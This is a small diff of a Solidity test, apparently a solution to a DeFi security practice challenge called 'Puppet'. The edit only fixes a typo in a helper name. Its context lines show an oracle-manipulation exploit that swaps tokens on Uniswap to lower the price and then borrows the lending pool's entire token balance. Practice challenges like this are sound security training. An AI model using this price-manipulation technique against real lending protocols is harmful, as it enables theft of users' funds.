@@ -122,10 +122,10 @@ contract Puppet is Test {
         uniswapExchange.tokenToEthSwapInput(dvt.balanceOf(attacker), 9 ether, block.timestamp + 100000);
         puppetPool.borrow{value: attacker.balance}(dvt.balanceOf(address(puppetPool)));
         vm.stopPrank();
-        verfiy();
+        verify();
     }
 
-    function verfiy() internal {
+    function verify() internal {
         // Attacker has taken all tokens from the pool
         assertGe(dvt.balanceOf(attacker), POOL_INITIAL_TOKEN_BALANCE);
         assertEq(dvt.balanceOf(address(puppetPool)), 0);
